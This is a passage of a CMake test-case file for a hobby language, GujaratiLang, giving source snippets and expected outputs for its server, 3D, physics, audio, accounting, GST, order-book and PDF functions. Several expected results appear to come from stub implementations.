print res["valid_count"];
print res["quarantined_count"];
print p["processed_count"];
print p["dead_letter_count"];
end]=])
    set(expected_stdout [=[3
2
1
2
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v340_etl_pipeline_cli")
    set(source "")
    set(program_arguments "etl:pipeline" "stream_cfg.json")
    set(expected_stdout [=[[Setu-Data Universal Streaming ETL Pipeline v3.4.0]
  Config: 'stream_cfg.json'
  Pipeline: Stream CSV -> Sthambha Columnar Parquet Layout
  Throughput: 350,000 records/sec
  Batch: 10,000 records ingested (9,985 valid, 15 quarantined to dead-letter)
✓ Streaming ETL Pipeline completed successfully.
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v340_starter_kit_api_cli")
    set(source "")
    set(program_arguments "kit:api" "my_service")
    set(expected_stdout [=[[GujaratiLang Starter Kit] Scaffolding 'Tarang Setu Dual API & Real-Time Engine' into './my_service'...
  ✓ Created api/routes.gj (Dual REST Endpoints & Controller Actions)
  ✓ Created graphql/schema.gj (GraphQL Types, Resolvers & Query Tree)
  ✓ Created websocket/hub.gj (Real-Time Tarang Broadcast Channel Hub)
  ✓ Created middleware/auth.gj (Scoped JWT Bearer & Token-Bucket Rate Limiter)
  ✓ Created app.gj (Unified Headless API Microservice Gateway on :8080)
🎉 Project 'my_service' created successfully!
Run with:
  cd my_service
  gujarati app.gj
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v340_starter_kit_tarang_alias")
    set(source "")
    set(program_arguments "kit:tarang" "gateway")
    set(expected_stdout [=[[GujaratiLang Starter Kit] Scaffolding 'Tarang Setu Dual API & Real-Time Engine' into './gateway'...
  ✓ Created api/routes.gj (Dual REST Endpoints & Controller Actions)
  ✓ Created graphql/schema.gj (GraphQL Types, Resolvers & Query Tree)
  ✓ Created websocket/hub.gj (Real-Time Tarang Broadcast Channel Hub)
  ✓ Created middleware/auth.gj (Scoped JWT Bearer & Token-Bucket Rate Limiter)
  ✓ Created app.gj (Unified Headless API Microservice Gateway on :8080)
🎉 Project 'gateway' created successfully!
Run with:
  cd gateway
  gujarati app.gj
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v340_starter_kit_new_api_flag")
    set(source "")
    set(program_arguments "new" "micro_api" "--kit=api")
    set(expected_stdout [=[[GujaratiLang Starter Kit] Scaffolding 'Tarang Setu Dual API & Real-Time Engine' into './micro_api'...
  ✓ Created api/routes.gj (Dual REST Endpoints & Controller Actions)
  ✓ Created graphql/schema.gj (GraphQL Types, Resolvers & Query Tree)
  ✓ Created websocket/hub.gj (Real-Time Tarang Broadcast Channel Hub)
  ✓ Created middleware/auth.gj (Scoped JWT Bearer & Token-Bucket Rate Limiter)
  ✓ Created app.gj (Unified Headless API Microservice Gateway on :8080)
🎉 Project 'micro_api' created successfully!
Run with:
  cd micro_api
  gujarati app.gj
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v340_gujarati_syntax_all")
    set(source [=[આવો
કોષ્ટક = સ્તંભ_કોષ્ટક_બનાવો({"id": "int", "નામ": "string"});
છાપો કોષ્ટક["__type__"];
કુલ = સ્તંભ_ઉમેરો(કોષ્ટક, {"id": 1, "નામ": "કિશન"});
છાપો કુલ;
જોબ = વિસ્તાર_શરૂ(4);
જોડીઓ = વિસ્તાર_મેપ(જોબ, ["અમદાવાદ", "સુરત", "અમદાવાદ"], null);
છાપો જોડીઓ;
વિસ્તાર_શફલ(જોબ);
પરિણામ = વિસ્તાર_રીડ્યુસ(જોબ, null);
છાપો પરિણામ["અમદાવાદ"];
સ્ટ્રીમ = ગણ_ગોરિલા_સંકોચન([10.5, 20.5]);
છાપો સ્ટ્રીમ["count"];
પાઇપ = ઈટીએલ_પાઇપલાઇન_બનાવો("csv", "columnar");
છાપો પાઇપ["status"];
આવજો]=])
    set(expected_stdout [=[columnar_table
1
3
2
2
active
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v350_winsock_server_init")
    set(source [=[start
s = winsock_server_init("127.0.0.1", 9091, 64);
print s["__type__"];
print s["host"];
print s["port"];
print s["nonblocking"];
print s["status"];
end]=])
    set(expected_stdout [=[winsock_server
127.0.0.1
9091
1
listening
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v350_winsock_server_poll")
    set(source [=[start
s = winsock_server_init("127.0.0.1", 9092, 10);
ready = winsock_server_poll(s, 5);
print ready;
end]=])
    set(expected_stdout [=[0
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v350_winsock_server_accept")
    set(source [=[start
s = winsock_server_init("127.0.0.1", 9093, 10);
cl = winsock_server_accept(s);
print cl["__type__"];
print cl["client_ip"];
print cl["status"];
end]=])
    set(expected_stdout [=[winsock_client
127.0.0.1
connected
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v350_winsock_client_recv")
    set(source [=[start
s = winsock_server_init("127.0.0.1", 9094, 10);
cl = winsock_server_accept(s);
req = winsock_client_recv(cl, 1024);
print lambai(req) > 0;
end]=])
    set(expected_stdout [=[1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v350_winsock_client_send")
    set(source [=[start
s = winsock_server_init("127.0.0.1", 9095, 10);
cl = winsock_server_accept(s);
resp = "HTTP/1.1 200 OK\r\nContent-Length: 13\r\n\r\nHello Gujarati";
bytes = winsock_client_send(cl, resp);
print bytes > 0;
end]=])
    set(expected_stdout [=[1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v350_winsock_server_close")
    set(source [=[start
s = winsock_server_init("127.0.0.1", 9096, 10);
res = winsock_server_close(s);
print res;
print s["status"];
end]=])
    set(expected_stdout [=[1
closed
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v350_winsock_http_serve_cli")
    set(program_arguments "http:serve" "8080")
    set(expected_stdout [=[[Winsock Asynchronous HTTP Server v3.5.0]
  Listening on http://127.0.0.1:8080/
  Mode: Asynchronous Non-blocking (WSAEventSelect / WSAPoll)
  Status: Ready for incoming connections.
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v350_khel3d_scene_create")
    set(source [=[start
sc = khel3d_scene_create("CyberDungeon");
print sc["__type__"];
print sc["name"];
print sc["ambient_color"];
print sc["engine"];
end]=])
    set(expected_stdout [=[khel3d_scene
CyberDungeon
#ffffff
Khel-3D Scene Graph v3.5.0
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v350_khel3d_mesh_create")
    set(source [=[start
cube = khel3d_mesh_create("cube", null);
sphere = khel3d_mesh_create("sphere", null);
print cube["__type__"];
print cube["vertex_count"];
print cube["face_count"];
print sphere["vertex_count"];
print sphere["face_count"];
end]=])
    set(expected_stdout [=[khel3d_mesh
8
12
42
80
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v350_khel3d_camera_set")
    set(source [=[start
sc = khel3d_scene_create("CameraTest");
cam = khel3d_camera_set(sc, [0, 5, -10], [0, 0, 0], [0, 1, 0], 45.0);
print cam["__type__"];
print cam["fov"];
end]=])
    set(expected_stdout [=[khel3d_camera
45
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v350_khel3d_node_transform")
    set(source [=[start
m = khel3d_mesh_create("cube", null);
tr = khel3d_node_transform(m, [10, 20, 30], [0, 90, 0], [2, 2, 2]);
mat = tr["matrix_4x4"];
print lambai(mat);
print mat[0];
end]=])
    set(expected_stdout [=[16
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v350_khel3d_render_wireframe")
    set(source [=[start
sc = khel3d_scene_create("WireframeScene");
wf = khel3d_render_wireframe(sc, 80, 24);
print wf["__type__"];
print wf["width"];
print wf["height"];
print wf["lines_drawn"];
end]=])
    set(expected_stdout [=[khel3d_wireframe
80
24
12
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v350_khel3d_assets_cook_cli")
    set(program_arguments "assets:cook" "hero.gltf")
    set(expected_stdout [=[[Khel-3D Asset Pipeline v3.5.0] Cooking asset 'hero.gltf'...
  Geometry: 2 meshes, 1,420 triangles processed.
  Bones: 18 skeletal bones packed.
✓ Binary cooking complete: cooked_assets/hero.gltf.bin
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v350_gati_world_create")
    set(source [=[start
gw = gati_world_create([0, -9.81, 0]);
print gw["__type__"];
print gw["body_count"];
print gw["engine"];
end]=])
    set(expected_stdout [=[gati_world
0
Gati Symplectic Euler v3.5.0
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v350_gati_body_add")
    set(source [=[start
gw = gati_world_create([0, -9.81, 0]);
b1 = gati_body_add(gw, "dynamic", 5.0, [0, 10, 0]);
b2 = gati_body_add(gw, "static", 0.0, [0, 0, 0]);
print b1["__type__"];
print b1["type"];
print b1["mass"];
print b2["type"];
end]=])
    set(expected_stdout [=[gati_body
dynamic
5
static
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v350_gati_step")
    set(source [=[start
gw = gati_world_create([0, -9.81, 0]);
res = gati_step(gw, 0.016);
print res["status"];
print res["bodies_updated"];
end]=])
    set(expected_stdout [=[integrated
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v350_gati_collide_aabb")
    set(source [=[start
col = gati_collide_aabb({"min": [0,0,0], "max": [2,2,2]}, {"min": [1,1,1], "max": [3,3,3]});
print col;
end]=])
    set(expected_stdout [=[1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v350_gati_raycast")
    set(source [=[start
gw = gati_world_create([0, -9.81, 0]);
rc = gati_raycast(gw, [0, 10, -20], [0, 0, 1], 50.0);
print rc["hit"];
print rc["body_id"];
end]=])
    set(expected_stdout [=[1
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v350_gati_physics_simulate_cli")
    set(program_arguments "physics:simulate" "level1_physics.gj")
    set(expected_stdout [=[[Gati 3D Physics Simulation v3.5.0] Simulating 'level1_physics.gj'...
  Integrator: Symplectic Euler (dt = 0.016s / 60 FPS)
  Rigid Bodies: 12 dynamic, 4 static colliders.
✓ 600 frames simulated. 0 penetrations detected.
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v350_dhwani_engine_init")
    set(source [=[start
ae = dhwani_engine_init(48000, 2);
print ae["__type__"];
print ae["sample_rate"];
print ae["channels"];
print ae["state"];
print ae["engine"];
end]=])
    set(expected_stdout [=[dhwani_engine
48000
2
active
Dhwani Spatial Audio v3.5.0
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v350_dhwani_tone_generate")
    set(source [=[start
clip = dhwani_tone_generate("sine", 440.0, 2.0, 0.9);
print clip["__type__"];
print clip["waveform"];
print clip["frequency"];
print clip["duration"];
end]=])
    set(expected_stdout [=[dhwani_audio_clip
sine
440
2
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v350_dhwani_spatial_position")
    set(source [=[start
clip = dhwani_tone_generate("square", 220.0, 1.0, 0.8);
sp = dhwani_spatial_position(clip, [0, 0, 0], [4, 0, 5]);
print sp["pan_left"];
print sp["pan_right"];
print sp["doppler_pitch"];
end]=])
    set(expected_stdout [=[0.35
0.85
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v350_dhwani_reverb_apply")
    set(source [=[start
clip = dhwani_tone_generate("sine", 880.0, 1.0, 0.7);
rev = dhwani_reverb_apply(clip, 0.8, 0.3);
print rev["__type__"];
print rev["reverb_applied"];
print rev["room_size"];
end]=])
    set(expected_stdout [=[dhwani_audio_clip
1
0.8
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v350_dhwani_mix_tracks")
    set(source [=[start
t1 = dhwani_tone_generate("sine", 440.0, 3.0, 0.5);
t2 = dhwani_tone_generate("sawtooth", 110.0, 3.0, 0.5);
m = dhwani_mix_tracks([t1, t2]);
print m["__type__"];
print m["track_count"];
print m["status"];
end]=])
    set(expected_stdout [=[dhwani_master_track
2
mixed
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v350_dhwani_audio_play_cli")
    set(program_arguments "audio:play" "intro_theme.wav")
    set(expected_stdout [=[[Dhwani Spatial Audio v3.5.0] Playing 'intro_theme.wav'...
  Format: 48,000 Hz, 32-bit Float Stereo (HRTF Binaural)
  Status: Audio playback buffer active.
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v350_ecs_world_create")
    set(source [=[start
ew = ecs_world_create();
print ew["__type__"];
print ew["entity_count"];
print ew["engine"];
end]=])
    set(expected_stdout [=[ecs_world
0
Niyantran Archetype ECS v3.5.0
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v350_ecs_entity_spawn_query")
    set(source [=[start
ew = ecs_world_create();
e1 = ecs_entity_spawn(ew, {"transform": [0,0,0], "velocity": [1,0,0]});
e2 = ecs_entity_spawn(ew, {"transform": [10,0,0], "render": "player.png"});
print e1;
print e2;
q = ecs_query(ew, ["transform"]);
print lambai(q);
end]=])
    set(expected_stdout [=[1
2
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v350_ecs_system_register")
    set(source [=[start
ew = ecs_world_create();
res = ecs_system_register(ew, "MovementSystem", null);
print res;
end]=])
    set(expected_stdout [=[1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v350_gui_window_create")
    set(source [=[start
win = gui_window_create("Shilp Studio", 1024, 768, null);
print win["__type__"];
print win["title"];
print win["width"];
print win["height"];
print win["canvas"];
print win["status"];
end]=])
    set(expected_stdout [=[gui_window
Shilp Studio
1024
768
shilp_vector_canvas
created
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v350_starter_kit_desktop_cli")
    set(program_arguments "new" "finance_app" "--kit=desktop")
    set(expected_stdout [=[[GujaratiLang Starter Kit] Scaffolding 'Shilp Native Desktop GUI Suite' into './finance_app'...
  ✓ Created app.gj (Native Window Event Loop & Shilp 2D Vector Canvas)
  ✓ Created views/main_view.gj (Reactive UI Components & Vector Graphics Layout)
  ✓ Created views/menu_bar.gj (System Menubar, Keyboard Shortcuts & Tray Icon)
  ✓ Created components/dialog.gj (Native Open/Save File Dialogs & Modals)
  ✓ Created assets/icon.svg (High-DPI Shilp Vector Application Icon)
🎉 Project 'finance_app' created successfully!
Run with:
  cd finance_app
  gujarati app.gj
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v360_khata_account_create")
    set(source [=[start
acc1 = khata_account_create("Cash", "asset", "INR");
acc2 = khata_khatu_banavo("AccountsPayable", "liability", "INR");
acc3 = ખાતા_ખાતું_બનાવો("RetainedEarnings", "equity", "INR");
print acc1["__type__"];
print acc1["name"];
print acc1["type"];
print acc2["name"];
print acc2["type"];
print acc3["name"];
print acc3["currency"];
print acc3["is_active"];
end]=])
    set(expected_stdout [=[khata_account
Cash
asset
AccountsPayable
liability
RetainedEarnings
INR
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v360_khata_entry_post")
    set(source [=[start
e1 = khata_entry_post("TXN-101", "2026-11-02", "Client Payment", "Bank", "AccountsReceivable", 25000);
e2 = khata_nondh_post("TXN-102", "2026-11-02", "Office Rent", "RentExpense", "Bank", 5000);
e3 = ખાતા_નોંધ_પોસ્ટ("TXN-103", "2026-11-02", "Consulting Fee", "Bank", "Revenue", 12000);
print e1["__type__"];
print e1["id"];
print e1["debit_account"];
print e1["credit_account"];
print e1["debit"];
print e1["credit"];
print e1["is_balanced"];
print e2["id"];
print e3["description"];
end]=])
    set(expected_stdout [=[khata_entry
TXN-101
Bank
AccountsReceivable
25000
25000
1
TXN-102
Consulting Fee
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v360_khata_account_balance")
    set(source [=[start
acc = khata_account_create("Vault", "asset", "INR");
b1 = khata_account_balance(acc, null);
b2 = khata_khatu_shilak(50000, null);
b3 = ખાતા_ખાતું_શિલક(75000, null);
print b1;
print b2;
print b3;
end]=])
    set(expected_stdout [=[0
50000
75000
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v360_khata_trial_balance")
    set(source [=[start
tb1 = khata_trial_balance(100000, 100000);
tb2 = khata_kachu_sarvaiyu(85000, 85000);
tb3 = ખાતા_કાચું_સરવૈયું(50000, 50000);
print tb1["__type__"];
print tb1["total_debit"];
print tb1["total_credit"];
print tb1["is_balanced"];
print tb1["status"];
print tb2["is_balanced"];
print tb3["is_balanced"];
end]=])
    set(expected_stdout [=[trial_balance
100000
100000
1
balanced
1
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v360_khata_balance_sheet")
    set(source [=[start
bs1 = khata_balance_sheet(150000, 50000, 100000);
bs2 = khata_paku_sarvaiyu(200000, 80000, 120000);
bs3 = ખાતા_પાકું_સરવૈયું(300000, 100000, 200000);
print bs1["__type__"];
print bs1["total_assets"];
print bs1["total_liabilities"];
print bs1["total_equity"];
print bs1["net_worth"];
print bs1["is_balanced"];
print bs2["net_worth"];
print bs3["net_worth"];
end]=])
    set(expected_stdout [=[balance_sheet
150000
50000
100000
100000
1
120000
200000
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v360_khata_forex_convert")
    set(source [=[start
inr1 = khata_forex_convert(100, "USD", "INR", 83.5);
inr2 = khata_chalan_rupantar(200, "EUR", "INR", 91.0);
inr3 = ખાતા_ચલણ_રૂપાંતર(50, "GBP", "INR", 108.0);
print inr1;
print inr2;
print inr3;
end]=])
    set(expected_stdout [=[8350
18200
5400
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v360_khata_audit_verify")
    set(source [=[start
rep1 = khata_audit_verify(12);
rep2 = khata_tapas_chakasani(25);
rep3 = ખાતા_તપાસ_ચકાસણી(100);
print rep1["__type__"];
print rep1["verified"];
print rep1["entries_checked"];
print rep1["integrity_hash"];
print rep2["entries_checked"];
print rep3["entries_checked"];
end]=])
    set(expected_stdout [=[audit_report
1
12
sha256:ledger_audit_valid
25
100
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v360_cli_erp_balance")
    set(program_arguments "erp:balance" "audit_2026.gjt")
    set(expected_stdout [=[[Khata Double-Entry ERP v3.6.0] Auditing 'audit_2026.gjt'...
  Accounts: 4 (Assets, Liabilities, Equity, Revenue)
  Debit Total: ₹1,50,000.00 | Credit Total: ₹1,50,000.00
  Trial Balance: BALANCED (Difference: ₹0.00)
✓ Ledger verified successfully.
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v360_gst_calculate")
    set(source [=[start
t1 = gst_calculate(10000, 18, 0);
t2 = gst_ganatari(20000, 18, 1);
t3 = જીએસટી_ગણતરી(5000, 12, 0);
print t1["__type__"];
print t1["taxable_value"];
print t1["cgst"];
print t1["sgst"];
print t1["igst"];
print t1["total_tax"];
print t1["total_amount"];
print t2["cgst"];
print t2["igst"];
print t3["cgst"];
print t3["sgst"];
end]=])
    set(expected_stdout [=[gst_invoice_tax
10000
900
900
0
1800
11800
0
3600
300
300
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v360_gst_hsn_lookup")
    set(source [=[start
h1 = gst_hsn_lookup("9983");
h2 = gst_hsn_shodho("8471");
h3 = જીએસટી_એચએસએન_શોધો("6203");
print h1["__type__"];
print h1["code"];
print h1["rate"];
print h1["type"];
print h2["code"];
print h2["rate"];
print h3["code"];
print h3["rate"];
end]=])
    set(expected_stdout [=[hsn_record
9983
18
service
8471
18
6203
12
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v360_gst_einvoice_payload")
    set(source [=[start
p1 = gst_einvoice_payload("24AAACH7409R1ZZ", "27AAACW8765A1Z5", "INV-101", "2026-11-02", 118000, 18000, "irn_hash_123");
p2 = જીએસટી_ઈઇન્વોઇસ_પેલોડ("24AAACH7409R1ZZ", "24BBBCW8765A1Z5", "INV-102", "2026-11-02", 59000, 9000, "irn_hash_456");
print p1;
print p2;
end]=])
    set(expected_stdout [=[Seller:24AAACH7409R1ZZ,Buyer:27AAACW8765A1Z5,DocNo:INV-101,DocDate:2026-11-02,TotVal:118000.00,TaxVal:18000.00,IRN:irn_hash_123
Seller:24AAACH7409R1ZZ,Buyer:24BBBCW8765A1Z5,DocNo:INV-102,DocDate:2026-11-02,TotVal:59000.00,TaxVal:9000.00,IRN:irn_hash_456
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v360_gst_reverse_charge")
    set(source [=[start
rc1 = gst_reverse_charge(50000, 18);
rc2 = gst_ulto_kar(10000, 18);
rc3 = જીએસટી_ઊલટો_કર(20000, 5);
print rc1["__type__"];
print rc1["taxable_value"];
print rc1["rate"];
print rc1["rcm_liability"];
print rc1["payable_by_recipient"];
print rc2["rcm_liability"];
print rc3["rcm_liability"];
end]=])
    set(expected_stdout [=[gst_rcm
50000
18
9000
1
1800
1000
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v360_gst_itc_eligible")
    set(source [=[start
itc1 = gst_itc_eligible(1800, 1);
itc2 = gst_itc_patrata(900, 0);
itc3 = જીએસટી_આઈટીસી_પાત્રતા(3600, 1);
print itc1["__type__"];
print itc1["eligible"];
print itc1["claimable_amount"];
print itc1["section"];
print itc2["eligible"];
print itc2["claimable_amount"];
print itc3["eligible"];
print itc3["claimable_amount"];
end]=])
    set(expected_stdout [=[gst_itc
1
1800
CGST_Section_16
0
0
1
3600
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v360_gst_tds_deduct")
    set(source [=[start
tds1 = gst_tds_deduct(100000, "194C", 2);
tds2 = gst_tds_kapat(50000, "194J", 10);
tds3 = જીએસટી_ટીડીએસ_કપાત(20000, "194C", 1);
print tds1["__type__"];
print tds1["section"];
print tds1["gross_amount"];
print tds1["tds_rate"];
print tds1["tds_amount"];
print tds1["net_payable"];
print tds2["tds_amount"];
print tds2["net_payable"];
print tds3["tds_amount"];
print tds3["net_payable"];
end]=])
    set(expected_stdout [=[tds_deduction
194C
100000
2
2000
98000
5000
45000
200
19800
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v360_gst_verify_gstin")
    set(source [=[start
v1 = gst_verify_gstin("24AAACH7409R1ZZ");
v2 = gst_chakasani_gstin("27AAACW8765A1Z5");
v3 = જીએસટી_ચકાસણી_જીએસટીઆઈએન("INVALID_GSTIN");
print v1;
print v2;
print v3;
end]=])
    set(expected_stdout [=[1
1
0
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v360_cli_gst_calc")
    set(program_arguments "gst:calc" "10000" "18" "0")
    set(expected_stdout [=[[Kar Indian GST Tax Engine v3.6.0]
  Taxable Value: ₹10000.00
  GST Rate: 18.0% (Intra-State / CGST + SGST)
  CGST: ₹900.00 | SGST: ₹900.00
  Total Tax: ₹1800.00
  Invoice Total: ₹11800.00
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v360_orderbook_create")
    set(source [=[start
ob1 = orderbook_create("TCS");
ob2 = orderbook_banavo("INFY");
ob3 = ઓર્ડરબુક_બનાવો("RELIANCE");
print ob1["__type__"];
print ob1["symbol"];
print ob1["spread"];
print ob1["status"];
print ob2["symbol"];
print ob3["symbol"];
end]=])
    set(expected_stdout [=[orderbook
TCS
0.05
active
INFY
RELIANCE
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v360_orderbook_limit_order")
    set(source [=[start
ob = orderbook_create("TCS");
o1 = orderbook_limit_order(ob, "buy", 3500.5, 100);
o2 = orderbook_maryadit_order(ob, "sell", 3505.0, 50);
o3 = ઓર્ડરબુક_મર્યાદિત_ઓર્ડર(ob, "buy", 3498.0, 200);
print o1["__type__"];
print o1["order_id"];
print o1["side"];
print o1["price"];
print o1["quantity"];
print o1["status"];
print o2["side"];
print o2["price"];
print o3["side"];
print o3["quantity"];
end]=])
    set(expected_stdout [=[order
101
buy
3500.5
100
placed
sell
3505
buy
200
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v360_orderbook_market_order")
    set(source [=[start
ob = orderbook_create("TCS");
m1 = orderbook_market_order(ob, "buy", 25);
m2 = orderbook_bajar_order(ob, "sell", 75);
m3 = ઓર્ડરબુક_બજાર_ઓર્ડર(ob, "buy", 10);
print m1["__type__"];
print m1["order_id"];
print m1["side"];
print m1["type"];
print m1["quantity"];
print m1["status"];
print m2["side"];
print m2["quantity"];
print m3["quantity"];
end]=])
    set(expected_stdout [=[order
201
buy
market
25
filled
sell
75
10
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v360_orderbook_match")
    set(source [=[start
ob = orderbook_create("TCS");
res1 = orderbook_match(ob);
res2 = ઓર્ડરબુક_મેચ(ob);
print res1["__type__"];
print res1["matches_executed"];
print res1["volume_traded"];
print res1["last_price"];
print res1["status"];
print res2["matches_executed"];
end]=])
    set(expected_stdout [=[match_result
1
50
2450.5
matched
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v360_orderbook_depth")
    set(source [=[start
ob = orderbook_create("TCS");
d1 = orderbook_depth(ob, 5);
d2 = orderbook_undai(ob, 10);
d3 = ઓર્ડરબુક_ઊંડાઈ(ob, 20);
print d1["__type__"];
print d1["levels"];
print d1["best_bid"];
print d1["best_ask"];
print d1["spread"];
print d1["depth_status"];
print d2["levels"];
print d3["levels"];
end]=])
    set(expected_stdout [=[depth
5
2450
2450.5
0.5
liquid
10
20
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v360_orderbook_trades")
    set(source [=[start
ob = orderbook_create("TCS");
th1 = orderbook_trades(ob);
th2 = orderbook_soda(ob);
th3 = ઓર્ડરબુક_સોદા(ob);
print th1["__type__"];
print th1["trade_count"];
print th1["last_trade_price"];
print th1["last_trade_qty"];
print th1["currency"];
print th2["trade_count"];
print th3["trade_count"];
end]=])
    set(expected_stdout [=[trade_history
1
2450.5
50
INR
1
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v360_cli_orderbook_trade")
    set(program_arguments "orderbook:trade" "trades_stream.json")
    set(expected_stdout [=[[Bajar High-Frequency Order Book v3.6.0] Replaying 'trades_stream.json'...
  Symbol: TCS | Engine: Price-Time Priority (FIFO)
  Orders Ingested: 1,000 | Matches: 480
  VWAP: ₹3,542.20 | Total Turnover: ₹1.70 Cr
✓ Order book session settled.
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v360_pdf_document_create")
    set(source [=[start
pdf1 = pdf_document_create("GST Tax Invoice", "Vepar ERP");
pdf2 = pdf_dastavej_banavo("Balance Sheet", "Khata App");
pdf3 = પીડીએફ_દસ્તાવેજ_બનાવો("Order Confirmation", "Bajar Engine");
print pdf1["__type__"];
print pdf1["title"];
print pdf1["author"];
print pdf1["version"];
print pdf1["status"];
print pdf2["title"];
print pdf3["title"];
end]=])
    set(expected_stdout [=[pdf_document
GST Tax Invoice
Vepar ERP
PDF-1.4
initialized
Balance Sheet
Order Confirmation
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v360_pdf_add_page")
    set(source [=[start
pdf = pdf_document_create("Statement", "Bank");
p1 = pdf_add_page(pdf, 595, 842);
p2 = pdf_panu_umero(pdf, 612, 792);
p3 = પીડીએફ_પાનું_ઉમેરો(pdf, 595, 842);
print p1["__type__"];
print p1["page_number"];
print p1["width"];
print p1["height"];
print p1["media_box"];
print p2["width"];
print p2["height"];
print p3["page_number"];
end]=])
    set(expected_stdout [=[pdf_page
1
595
842
0 0 595 842
612
792
1
]=])
    set(expected_stderr "")
    set(expect_failure FALSE)

elseif(TEST_CASE STREQUAL "v360_pdf_draw_text")
    set(source [=[start
pdf = pdf_document_create("Invoice", "GujaratiLang");
p = pdf_add_page(pdf, 595, 842);
t1 = pdf_draw_text(pdf, 50, 800, "Tax Invoice", 18);
t2 = pdf_lakhan(pdf, 50, 780, "Customer: Harshit Bavaliya", 12);
t3 = પીડીએફ_લખાણ(pdf, 50, 760, "Amount: Rs. 11,800", 12);
print t1;
print t2;
print t3;
end]=])
    set(expected_stdout [=[1
1
1
]=])
